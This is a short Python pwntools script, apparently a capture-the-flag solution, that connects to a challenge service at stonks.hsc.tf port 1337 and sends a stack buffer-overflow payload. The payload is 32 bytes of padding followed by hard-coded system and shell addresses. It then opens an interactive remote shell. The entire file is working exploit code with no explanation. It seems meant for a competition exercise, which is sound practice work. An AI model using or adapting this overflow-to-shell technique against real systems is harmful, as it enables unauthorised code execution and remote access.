from pwn import *
from subprocess import *

HOST = "stonks.hsc.tf"
PORT = 1337

elf = ELF('./chal')

r = remote(HOST, PORT)

PADDING = b'A' * 32

system = p64(0x7fffff04f550)
shell =  p64(0x00401260)

PAYLOAD = PADDING + system + shell 

r.sendline(PAYLOAD)
r.interactive()
